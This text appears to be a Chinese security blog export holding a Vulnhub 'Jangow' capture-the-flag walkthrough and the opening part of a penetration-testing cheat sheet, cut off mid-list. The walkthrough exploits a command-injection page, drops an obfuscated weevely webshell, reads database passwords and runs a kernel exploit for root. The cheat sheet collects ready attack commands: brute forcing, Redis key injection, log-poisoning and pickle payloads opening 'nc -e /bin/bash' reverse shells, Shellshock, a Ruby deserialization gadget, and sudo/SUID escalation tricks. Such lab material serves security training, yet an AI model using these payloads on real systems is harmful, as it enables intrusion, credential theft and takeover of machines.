0.041 days (since Tue Feb 14 06:38:08 2023)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=263 (Good luck!)IP ID Sequence Generation: All zerosService Info: Host: 127.0.0.1; OS: Unix Web路径枚举 dirb http://192.168.56.118/ -w 123---- Scanning URL: http://192.168.56.118/ ----+ http://192.168.56.118/server-status (CODE:403|SIZE:279) ==&gt; DIRECTORY: http://192.168.56.118/site/ dirb http://192.168.56.118/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 123456---- Scanning URL: http://192.168.56.118/site/ ----==&gt; DIRECTORY: http://192.168.56.118/site/assets/ ==&gt; DIRECTORY: http://192.168.56.118/site/css/ + http://192.168.56.118/site/index.html (CODE:200|SIZE:10190) ==&gt; DIRECTORY: http://192.168.56.118/site/js/ ==&gt; DIRECTORY: http://192.168.56.118/site/wordpress/ 漏洞利用 访问http://192.168.56.118/site/ 点击右上角Buscar按钮跳转至http://192.168.56.118/site/busque.php?buscar= 简单测试后发现命令执行漏洞 curl http://192.168.56.118/site/busque.php?buscar=ls 123456assetsbusque.phpcssindex.htmljswordpress 以防万一，确认一下黑名单 curl 'http://192.168.56.118/site/busque.php?buscar=cat+./busque.php' 1&lt;?php system($_GET[&#x27;buscar&#x27;]); ?&gt; 确认写入权限 curl 'http://192.168.56.118/site/busque.php?buscar=ls+-la' 12345678910total 44drwxr-xr-x 6 www-data www-data 4096 Feb 13 17:59 .drwxr-xr-x 3 root root 4096 Oct 31 2021 ..-rw-r--r-- 1 www-data www-data 1584 Feb 13 17:59 \\drwxr-xr-x 3 www-data www-data 4096 Jun 3 2021 assets-rw-r--r-- 1 www-data www-data 35 Jun 10 2021 busque.phpdrwxr-xr-x 2 www-data www-data 4096 Jun 3 2021 css-rw-r--r-- 1 www-data www-data 10190 Jun 10 2021 index.htmldrwxr-xr-x 2 www-data www-data 4096 Jun 3 2021 jsdrwxr-xr-x 2 www-data www-data 4096 Jun 10 2021 wordpress curl 'http://192.168.56.118/site/busque.php?buscar=id' 1uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) 尝试反弹Shell，失败 尝试通过Web服务传递Webshell，失败 疑似Ban了主动请求 echo -n '&lt;?php eval($_POST[&quot;BFL&quot;]);?&gt;' | base64 1PD9waHAgZXZhbCgkX1BPU1RbIkJGTCJdKTs/Pg== 1curl &#x27;http://192.168.56.118/site/busque.php?buscar=echo+-n+PD9waHAgZXZhbCgkX1BPU1RbIkJGTCJdKTs/Pg==|base64+-d&gt;bfl.php&#x27; 12345678910111213141516weevely generate Bufferfly BFL.phpcat BFL.php | base64PD9waHAKJHo9JyRrPSI1TGJMMmNMMjhlTGMiOyRraD0iNDE1NmRiYUwwNTM1NyJMOyRrZj0iNzc3MmYxOEwyTDg1YWIiOyRwPSJMJzsKJGw9J2JhTHNlNjRfZW5jb2RlKEBMTHhMKExAZ3pjb21McHJMZXNzKCRvKSwkaykpO3ByaW50KCIkcCRraCRyJGtmIik7fSc7CiRBPSd0Y0xoKCIvJGtoKC4rKUwka0xmLyIsQGZpbGVfZ2V0X2NvbnRMZW50cygicExocDovTC9pbnB1dEwiKSwkbSk9JzsKJHE9J3JsZUxuKCRMdClMOyRvPSIiO2ZvcigkaUw9MDskaTwkbDtMTCl7Zm9Mcigkaj0wO0woJGo8JExjJiYkaTwkbCk7TCc7CiRUPSdMPTEpIEx7QG9MYl9zdGFydCgpTDtAZUx2YWwoQGd6dW5MY29tTHByZXNMcyhAeChAYkxhc2U2NExfZGVjb2RlKCQnOwokdD0nJGorTCssJGkrKyl7TCRvLj0kdEx7JGl9XiRreyRqfUw7fX1yZUx0dXJMbiAkbzt9aWYgTChAcHJlZ19MbUxMYSc7CiRkPXN0cl9yZXBsYWNlKCdTeicsJycsJ1N6Y3JlYXRTemVfU3pTemZTenVuU3pjdGlvbicpOwokWD0nbUxbTDFdKSwkaykpKTskTG89QG9MYl9nTGV0X2NvbnRMZW50THMoKTtAb2JfZW5MZF9jbGVMYW4oKTtMJHJMPUAnOwokdz0nRVZsNUx0dTJjNExKYXdDdXZrTEwiO2Z1bmN0aW9MbiB4KCR0LExMJGspeyRjPXN0ckxsTGVuKCRrKTskbD1zdCc7CiRmPXN0cl9yZXBsYWNlKCdMJywnJywkei4kdy4kcS4kdC4kQS4kVC4kWC4kbCk7CiRVPSRkKCcnLCRmKTskVSgpOwo/Pgo= 1curl &#x27;http://192.168.56.118/site/bfl.php&#x27; --data &quot;BFL=system(&#x27;echo -n PD9waHAKJHo9JyRrPSI1TGJMMmNMMjhlTGMiOyRraD0iNDE1NmRiYUwwNTM1NyJMOyRrZj0iNzc3MmYxOEwyTDg1YWIiOyRwPSJMJzsKJGw9J2JhTHNlNjRfZW5jb2RlKEBMTHhMKExAZ3pjb21McHJMZXNzKCRvKSwkaykpO3ByaW50KCIkcCRraCRyJGtmIik7fSc7CiRBPSd0Y0xoKCIvJGtoKC4rKUwka0xmLyIsQGZpbGVfZ2V0X2NvbnRMZW50cygicExocDovTC9pbnB1dEwiKSwkbSk9JzsKJHE9J3JsZUxuKCRMdClMOyRvPSIiO2ZvcigkaUw9MDskaTwkbDtMTCl7Zm9Mcigkaj0wO0woJGo8JExjJiYkaTwkbCk7TCc7CiRUPSdMPTEpIEx7QG9MYl9zdGFydCgpTDtAZUx2YWwoQGd6dW5MY29tTHByZXNMcyhAeChAYkxhc2U2NExfZGVjb2RlKCQnOwokdD0nJGorTCssJGkrKyl7TCRvLj0kdEx7JGl9XiRreyRqfUw7fX1yZUx0dXJMbiAkbzt9aWYgTChAcHJlZ19MbUxMYSc7CiRkPXN0cl9yZXBsYWNlKCdTeicsJycsJ1N6Y3JlYXRTemVfU3pTemZTenVuU3pjdGlvbicpOwokWD0nbUxbTDFdKSwkaykpKTskTG89QG9MYl9nTGV0X2NvbnRMZW50THMoKTtAb2JfZW5MZF9jbGVMYW4oKTtMJHJMPUAnOwokdz0nRVZsNUx0dTJjNExKYXdDdXZrTEwiO2Z1bmN0aW9MbiB4KCR0LExMJGspeyRjPXN0ckxsTGVuKCRrKTskbD1zdCc7CiRmPXN0cl9yZXBsYWNlKCdMJywnJywkei4kdy4kcS4kdC4kQS4kVC4kWC4kbCk7CiRVPSRkKCcnLCRmKTskVSgpOwo/Pgo= | base64 -d &gt; BFL.php&#x27;);&quot; weevely http://192.168.56.118/site/BFL.php Bufferfly 算是获取了个Shell吧 权限提升 cat user.txt d41d8cd98f00b204e9800998ecf8427e cat /var/www/html/.backup 123456789101112$servername = &quot;localhost&quot;;$database = &quot;jangow01&quot;;$username = &quot;jangow01&quot;;$password = &quot;abygurl69&quot;;// Create connection$conn = mysqli_connect($servername, $username, $password, $database);// Check connectionif (!$conn) &#123; die(&quot;Connection failed: &quot; . mysqli_connect_error());&#125;echo &quot;Connected successfully&quot;;mysqli_close($conn); cat /var/www/html/site/wordpress/config.php 1234567891011121314&lt;?php$servername = &quot;localhost&quot;;$database = &quot;desafio02&quot;;$username = &quot;desafio02&quot;;$password = &quot;abygurl69&quot;;// Create connection$conn = mysqli_connect($servername, $username, $password, $database);// Check connectionif (!$conn) &#123; die(&quot;Connection failed: &quot; . mysqli_connect_error());&#125;echo &quot;Connected successfully&quot;;mysqli_close($conn);?&gt; cat /etc/passwd | grep home 12syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;falsejangow01:x:1000:1000:desafio02,,,:&#x2F;home&#x2F;jangow01:&#x2F;bin&#x2F;bash netstat里面看见了SSH，但是连不上，估计是配iptables了 在Virtualbox中登录（偷看WP的） 12jangow01abygurl69 逛一圈后没看见什么有价值的信息 uname -a 1Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux https://www.exploit-db.com/exploits/45010 文件保存到本地 编译 1gcc exp.c -o exp weevely中上传并赋权 12:file_upload ./exp /tmp/expchmod +x /tmp/exp VirtualBox终端中jangow01用户运行 1/tmp/exp cat /root/proof.txt 123456789101112131415161718192021222324252627282930 @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; @ @@@@@@@@@@@@@@@&amp;# #@@@@@@@@&amp;(. &#x2F;&amp;@@@@@@@@@@ @ @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((&#x2F;&#x2F;#&amp;@@@&amp; .&amp;@@@@@ @ @@@@@@@&amp; @@@@@@&amp;@@@@@&amp;%######%&amp;@* .&#x2F;@@* &amp;@@ @ @@@@@* (@@@@@@@@@#&#x2F;. .*@. .#&amp;. &amp;@@@&amp;&amp; @ @@@, &#x2F;@@@@@@@@#, .@. ,&amp;, @@&amp;&amp; @ @&amp; @@@@@@@@#. @@@,@@@&#x2F; %. #, %@&amp; @@@# @@@@@@@@&#x2F; .@@@@@@@@@@ * ., @@ @@&amp; @@@@@@@@* @@@@@@@@@@@ , @ @&amp; .@@@@@@@( @@@@@@@@@@@@@@@@@@@@@ *. &amp;@ @@&#x2F; *@@@@@@@&#x2F; @@@@@@@@@@@# @@ @@ .@@@@@@@&#x2F; @@@@@@@@@@@@@ @# @@ @@ @@@@@@@@. @@@@@@@@@@@ @@( @@ @&amp; .@@@@@@@@. , @@@@@@@ * .@@@*( .@ @@ ,@@@@@@@@, @@@@@@@@@&amp;*%@@@@@@@@@, @@@@@(%&amp;* &amp;@ @@&amp; @@@@@@@@@@@@@@@@@ (@@@@@@@@@@@@@@%@@&#x2F; &amp;@ @ @&amp; ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%* &amp;@ @ @@. .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%* &amp;@&amp; @ @@@&amp; ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&#x2F; &amp;@@&amp;&amp; @ @@@@@@. *%@@@@@@@@@@@@@@@@@@@@&amp;#&#x2F;. &amp;@@@@&amp;&amp; @ @@@@@@@@&amp; JANGOW &amp;@@@ @ &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp; @@(&amp;@ @. %.@ @@%@ &amp;@@@&amp;&amp;&amp;&amp; &amp;&amp;&amp;@@@@&amp;% &amp;&#x2F; (&amp;&amp;@@@&amp;&amp;&amp; (((((((((((((((((((((((((((((da39a3ee5e6b4b0d3255bfef95601890afd80709 网络问题 123456789101112131415161718192021222324252627282930313233iptables -L...Chain ufw-user-forward (1 references)target prot opt source destination Chain ufw-user-input (1 references)target prot opt source destination ACCEPT tcp -- anywhere anywhere tcp dpt:ftpACCEPT tcp -- anywhere anywhere tcp dpt:httpACCEPT udp -- anywhere anywhere udp dpt:httpChain ufw-user-limit (0 references)target prot opt source destination LOG all -- anywhere anywhere limit: avg 3&#x2F;min burst 5 LOG level warning prefix &quot;[UFW LIMIT BLOCK] &quot;REJECT all -- anywhere anywhere reject-with icmp-port-unreachableChain ufw-user-limit-accept (0 references)target prot opt source destination ACCEPT all -- anywhere anywhere Chain ufw-user-logging-forward (0 references)target prot opt source destination Chain ufw-user-logging-input (0 references)target prot opt source destination Chain ufw-user-logging-output (0 references)target prot opt source destination Chain ufw-user-output (1 references)target prot opt source destination ACCEPT tcp -- anywhere anywhere tcp dpt:httpsACCEPT udp -- anywhere anywhere udp dpt:https 配置iptable来Ban掉反弹Shell倒是第一次见，在这上面也确实浪费了一些时间 有SSH不用非要用VirtualBox终端登录 非常规，有点整活 123456789101112131415localectl System Locale: LANG&#x3D;pt_BR.UTF-8 LANGUAGE&#x3D;pt_BR:pt:en LC_NUMERIC&#x3D;pt_BR LC_TIME&#x3D;pt_BR LC_MONETARY&#x3D;pt_BR LC_PAPER&#x3D;pt_BR LC_NAME&#x3D;pt_BR LC_ADDRESS&#x3D;pt_BR LC_TELEPHONE&#x3D;pt_BR LC_MEASUREMENT&#x3D;pt_BR LC_IDENTIFICATION&#x3D;pt_BR VC Keymap: n&#x2F;a X11 Layout: br X11 Model: a4techKB21 但是比上次的西语键盘好摁点 参考资料 WP","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://yoloyolo.top/tags/Vulnhub/"}]},{"title":"靶机渗透手册","slug":"Drone-Pentest-Handbook","date":"2023-02-08T16:15:20.000Z","updated":"2023-03-01T17:19:59.496Z","comments":true,"path":"2023/02/08/Drone-Pentest-Handbook/","link":"","permalink":"https://yoloyolo.top/2023/02/08/Drone-Pentest-Handbook/","excerpt":"迟来的文章","text":"迟来的文章 靶机渗透手册 2020/10/28 21:19:49 情报收集 实际渗透 全流程信息收集方法总结 渗透测试信息收集心得分享 靶机渗透 查找IP 主办方给出(比赛) netdiscover 路由器查看主机IP(需权限) 根据虚拟机IP分布，用浏览器逐个访问IP(仅限存在WEB服务，不推荐) nmap -sn -T5 192.168.0.0/24 | grep -B2 -E &quot;(virtual|VMware)&quot;(虚拟机的MAC地址) arp-scan -l 端口扫描 nmap -p 1-65535 -sV -v -T5 -n 192.168.0.0 Web路径 dirb http://192.168.0.0/ -w gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -u http://192.168.0.1/ SMB信息枚举 enum4linux 192.168.0.0 漏洞分析 SSH弱口令 FTP匿名登入 SMB弱口令 NFS目录挂载 Web服务框架 Web爆破 LDAP Redis未授权 其他漏洞 searchsploit 漏洞利用 SSH弱口令 hydra -V -I -f -t 64 -L user -P pass ssh://192.168.0.0:22 FTP匿名登入 12ftp 192.168.0.1anonymous 获取敏感文件 FTP Banner SMB弱口令 enum4limux 192.168.0.0 hydra -L user -P pass -I -e n smb://192.168.0.0 smbmap -H 192.168.0.0 smbclient //192.168.0.0/dir -U username 使用smbclient登入时需要确保路径/用户名/口令都正确 NFS目录挂载 123456789101112apt-get install nfs-commonvim /etc/exports /share1 *(sync,ro) 192.168.0.0(sync,rw)systemctl restart rpcbindsystemctl restart nfsshowmount -e 192.168.0.0 Export list for 192.168.0.0: /home/peter *mkdir /mnt/share1mount -t nfs 192.168.0.0:/home/peter /mnt/share1cd /mnt/share1ls Web框架 drupal : RCE(https://github.com/dreadlocked/Drupalgeddon2) wordpress : wpscan – https://www.exploit-db.com/ | searchsploit wpscan --url http://192.168.0.0/ -e ap --plugins-detection Aggressive Appearance -&gt; Editor -&gt; 404.php: /wp-content/twentyfourteen/404.php webmin : MSF(exploit/linux/http/webmin_packageup_rce) robots.txt struts2漏洞 flask SSTI Web爆破 Web页面内容生成字典 : cewl http://192.168.31.39/websec -w pass hydra-post-form : hydra -I -l contact@hacknos.com -P FuzzDicts-master/passwordDict/top6000.txt -vV -f 192.168.31.39 http-post-form &quot;/websec/login:username=^USER^&amp;password=^PASS^:Wrong&quot; JWT : https://github.com/brendan-rius/c-jwt-cracker 123456.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSJ9.Xjc37g2j_pU5SFHYwoPSHWJDEmRVPtfHkbFfGPcn4W0pip install pyjwtpython&gt;&gt;&gt; import jwt&gt;&gt;&gt; jwt.encode(&#123;&#39;username&#39;: &#39;admin&#39;&#125;, &#39;1Kun&#39;, algorithm&#x3D;&#39;HS256&#39;)&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo&#39; HTTP-Basic认证 配合Burp的Intruder模块 字典生成脚本 12345678910111213141516171819202122#test.pyimport base64raw = [ &#x27;Recon&#x27;, &#x27;Web&#x27;, &#x27;Home&#x27;, &#x27;Service&#x27;, &#x27;Blog&#x27;, &#x27;hackNos&#x27;, &#x27;TroubleShoot&#x27;, &#x27;Security&#x27;, &#x27;Recon Security&#x27;, &#x27;Secure&#x27;, &#x27;root&#x27;, &#x27;5ecure&#x27;, &#x27;admin&#x27;, &#x27;Secure@hackNos&#x27;, &#x27;Security@hackNos&#x27;, &#x27;&#x27;]for i in raw: for j in raw: print base64.b64encode(j + &#x27;:&#x27; + i) LDAP nmap 192.168.0.0 -p 389 --script ldap-search --script-args 'ldap.username=&quot;cn=admin,dc=admin,dc=local&quot;,ldap.password=password' Redis未授权 php文件 1234config set dir /var/www/html/config set dbfilename shell.phpset webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;save SSH秘钥 123456789rm -rf ~/.ssh/id*ssh-keygen -t rsa(echo -e &quot;\\n\\n&quot;;cat ~/.ssh/id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; new.txtredis-cli -h 192.168.0.0 flushallcat new.txt | redis-cli -h 1192.168.0.0 -x set crackitredis-cli -h 192.168.0.0 config set dir /var/lib/redis/.ssh/redis-cli -h 192.168.0.0 config set dbfilename &quot;authorized_keys&quot;redis-cli -h 192.168.0.0 savessh -i /root/.ssh/id_rsa redis@192.168.0.0 其他漏洞 git信息泄露 : githack DS_Store文件泄露 : ds_store_exp SMTP + LFI = GetShell 123456789telnet 192.168.0.0 25MAIl FROM: &lt;Hacker&gt;RCPT TO: Usernamedata&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;.quit~~~~~&#x2F;index.php?file&#x3D;&#x2F;var&#x2F;mail&#x2F;Username&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.0.1 8081 SSH + LFI = GetShell 12ssh &#39;&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;&#39;@192.168.0.0file.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;pass&#x3D;ls ProFTPd 1.3.5 mod_copy InfoLeak&amp;RCE 123456789nc 192.168.0.0 21site cpfr &#x2F;etc&#x2F;passwdsite cpto &#x2F;home&#x2F;ftp~~~~~~nc 192.168.0.0 21site cpfr &#x2F;proc&#x2F;self&#x2F;cmdlinesite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.phpsite cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.phpsite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php ShellShock env x='() &#123; :;&#125;; echo vulnerable' bash -c &quot;echo this is a test&quot; (CVE-2014-6271) env -i X=';() &#123; (a)=&gt;\\' bash -c 'echo date'; cat echo (CVE-2014-7169) /cgi-bin/* 200 curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.0.0/cgi-bin/ Ruby YAML.Load() Deserialization 12345678910111213141516171819---- !ruby/object:Gem::Installer i: x- !ruby/object:Gem::SpecFetcher i: y- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#x27;Kernel&#x27; method_id: :system git_set: &quot;touch /tmp/hacked&quot; method_id: :resolve 权限提升 cap特权 getcap -r / 2&gt; /dev/null Capabilities Description CAP_AUDIT_CONTROL 启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则 CAP_AUDIT_READ 允许通过 multicast netlink 套接字读取审计日志 CAP_AUDIT_WRITE 将记录写入内核审计日志 CAP_BLOCK_SUSPEND 使用可以阻止系统挂起的特性 CAP_CHOWN 修改文件所有者的权限 CAP_DAC_OVERRIDE 忽略文件的 DAC 访问限制 CAP_DAC_READ_SEARCH 忽略文件读及目录搜索的 DAC 访问限制 CAP_FOWNER 忽略文件属主 ID 必须和进程用户 ID 相匹配的限制 CAP_FSETID 允许设置文件的 setuid 位 CAP_IPC_LOCK 允许锁定共享内存片段 CAP_IPC_OWNER 忽略 IPC 所有权检查 CAP_KILL 允许对不属于自己的进程发送信号 CAP_LEASE 允许修改文件锁的 FL_LEASE 标志 CAP_LINUX_IMMUTABLE 允许修改文件的 IMMUTABLE 和 APPEND 属性标志 CAP_MAC_ADMIN 允许 MAC 配置或状态更改 CAP_MAC_OVERRIDE 忽略文件的 DAC 访问限制 CAP_MKNOD 允许使用 mknod() 系统调用 CAP_NET_ADMIN 允许执行网络管理任务 CAP_NET_BIND_SERVICE 允许绑定到小于 1024 的端口 CAP_NET_BROADCAST 允许网络广播和多播访问 CAP_NET_RAW 允许使用原始套接字 CAP_SETGID 允许改变进程的 GID CAP_SETFCAP 允许为文件设置任意的 capabilities CAP_SETPCAP 参考 capabilities man page CAP_SETUID 允许改变进程的 UID CAP_SYS_ADMIN 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等 CAP_SYS_BOOT 允许重新启动系统 CAP_SYS_CHROOT 允许使用 chroot() 系统调用 CAP_SYS_MODULE 允许插入和删除内核模块 CAP_SYS_NICE 允许提升优先级及设置其他进程的优先级 CAP_SYS_PACCT 允许执行进程的 BSD 式审计 CAP_SYS_PTRACE 允许跟踪任何进程 CAP_SYS_RAWIO 允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备 CAP_SYS_RESOURCE 忽略资源限制 CAP_SYS_TIME 允许改变系统时钟 CAP_SYS_TTY_CONFIG 允许配置 TTY 设备 CAP_SYSLOG 允许使用 syslog() 系统调用 CAP_WAKE_ALARM 允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器) 流量监听 123tcpdump -Dtimeout 120 tcpdump -i interface -w cap.pcaptcpdump -r cap.pcap 1timeout 120 tshark -i interface Shell 1234python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;python -c &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27; tty(输出至终端/需要注意tty的写入权限) 123tty&#x2F;dev&#x2F;pts&#x2F;0cat &#x2F;etc&#x2F;passwd &gt; &#x2F;dev&#x2F;pts&#x2F;0 密码 密码共用 WEB账户 WEB admin SSH FTP MySQL root Redis /etc/passwd &amp; /etc/shadow 12hashcat --help | grep Unixhashcat -m 500 -a 0 -o found.txt crack.hash rockyou.txt 123echo &#x27;$1$flag$vqjCxzjtRc7PofLYS2lWf/&#x27; &gt; passwdjohn --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long passwdjohn --show passwd unshadow ssh 12/usr/share/john/ssh2john.py id_rsa &gt; sshjohn --wordlist=/usr/share/wordlists/rockyou.txt ssh wordpress – PPP – phpass passwd/shadow Method hashcat -m john --format= $1 md5 500 md5crypt-long $2* bcrypt(Blow Fish) 3200 bcrypt $5 sha256 7400 sha256crypt $6 sha512 1800 sha512crypt 本地服务探测 netstat ss UDF提权 插件路径: show variables like 'plugin_dir'; 文件权限: SHOW VARIABLES LIKE &quot;secure_file_priv&quot;; mysqld.conf: “secure_file_priv=” 该值为空则无限制 该值为NULL则不可写入 该值为路径则可写入该路径（不包含子路径） 123456use mysql;create table foo(line blob);insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;create function sys_eval returns string soname &#39;udf.so&#39;;select sys_eval(&#39;id&#39;); UDF文件(dll/so) Metasploit 1234&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.dll&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.so&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.so 可以使用IDA来查看具体有哪些函数 sys_get sys_exec sys_eval sys_set sys_bineval SQLMap 1234&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;32&#x2F;lib_mysqludf_sys.so_&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so_&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;32&#x2F;lib_mysqludf_sys.dll_&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;64&#x2F;lib_mysqludf_sys.dll_ Decode python .\\cloak.py -d -i ..\\..\\udf\\mysql\\linux\\64\\lib_mysqludf_sys.so_ -o linux_udf_64.so Mysql执行系统命令 system whoami (version &gt;= 5.7) SUDO &amp; SUID https://gtfobins.github.io/ 使用Shell脚本进行提权，参数带有空格时需要用引号 SUID: find / -user root -perm -4000 -print 2&gt;/dev/null 123sudo susudo -icat &#x2F;etc&#x2F;sudoers 查看可以以sudo模式运行的程序 sudo -l 当sudo权限的命令受到执行路径的限制时，可以使用../来进行bypass python: python -c 'import os;os.system(&quot;/bin/bash&quot;)' input(): __import__('os').system('/bin/sh') lib文件写入命令 pickle unserialize 123456789import pickleimport base64import osclass RCE(object): def __reduce__(self): cmd &#x3D; (&#39;nc -e &#x2F;bin&#x2F;bash 192.168.0.1 8080&#39;) return os.system, (cmd,)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: print(base64.urlsafe_b64encode(pickle.dumps(RCE()))) 1234567import pickleimport urllibclass payload(object): def __reduce__(self): return (eval,(&quot;(open(&#39;&#x2F;flag,txt&#39;),&#39;r).read()&quot;,))print(urllib.quote((pickle.dumps(payload())))) php: php -r &quot;system('/bin/bash');&quot; rpm: rpm --eval '%&#123;lua:posix.exec(&quot;/bin/bash&quot;)&#125;' dpkg 12345gem install fpmmkdir exp &amp;&amp; cd expecho -e &#39;#!&#x2F;bin&#x2F;bash\\n&#x2F;bin&#x2F;bash&#39; &gt; exp.shfpm -s dir -t deb -n exp --before-install exp.sh .&#x2F;dpkg -i exp_1.0_amd64.deb ruby: ruby -e 'exec &quot;/bin/bash&quot;' gcc: gcc -wrapper /bin/bash,-s . perl: perl -e 'exec &quot;/bin/bash&quot;;' java: 12345678910111213141516171819202122232425import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;public class sudo &#123; public static void main(String[] args) &#123; ProcessBuilder processBuilder = new ProcessBuilder(); processBuilder.command(&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;whoami &gt; whoami&quot;); try &#123; Process process = processBuilder.start(); BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); String line; while ((line = reader.readLine()) != null) &#123; System.out.println(line); &#125; int exitCode = process.waitFor(); System.out.println(&quot;\\nExited with error code : &quot; + exitCode); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 12javac sudo.javajava sudo mysql: mysql -e '\\! /bin/bash' nmap 2.02 &lt;= nmap -v &lt;=5.21 12nmap --interactive!sh vim 浏览/etc/shadow shell 123vim:set shell&#x3D;&#x2F;bin&#x2F;sh:shell less more nano cp 覆盖passwd（垂直） 写入authorized_keys（水平） –no-preserve=mode mv wget find find . -exec whoami \\; find . -exec /bin/bash -p\\; 123读取：***写入：**2执行：**4(bash); 1**, *1*, **1(exec) bash bash -p awk awk '/RE/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd /tmp/1 是写好的账户信息 RE用于匹配passwd中某单独一行的结尾部分 tee: echo 1 | tee /etc/passwd unzip 1234cat &#x2F;etc&#x2F;passwd &gt; passwdecho data &gt;&gt; passwdzip new.zip passwdunzip new.zip -d &#x2F;etc&#x2F; https://gtfobins.github.io/ $PATH 目标文件为二进制可执行文件 需要知道目标文件所执行的命令 strings查看可执行文件内容 echo 12345678cd &#x2F;tmpecho &quot;&#x2F;bin&#x2F;bash&quot; &gt; pschmod 777 psecho $PATHexport PATH&#x3D;&#x2F;tmp:$PATHcd &#x2F;usr&#x2F;bin.&#x2F;shellwhoami copy 12345678cd &#x2F;tmpcp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;pschmod 777 psecho $PATHexport PATH&#x3D;&#x2F;tmp:$PATHcd &#x2F;usr&#x2F;bin.&#x2F;shellwhoami symlink 12345678cd &#x2F;tmpln -s &#x2F;bin&#x2F;bash pschmod 777 psecho $PATHexport PATH&#x3D;&#x2F;tmp:$PATHcd &#x2F;usr&#x2F;bin.&#x2F;shellwhoami mail cat /var/spool/mail/* crontab cat /etc/crontab ls -la /var/spool/cron/ ls -la /tmp crontab -e crontab所执行的命令一般来说是难以通过ps命令来发现的，除非是在命令执行的过程中正好使用ps命令查看进程 这对于耗时长的命令或者是使用脚本循环执行命令来说是可行的，但是对于几乎瞬时完成的命令则是束手无策 可以使用pspy来持续地监视后台进程 https://github.com/DominicBreuker/pspy 一般的crontab设置为整分运行，pspy每分钟的第一秒显示的命令即为crontab的内容 目录权限 r 列出目录中的内容 w 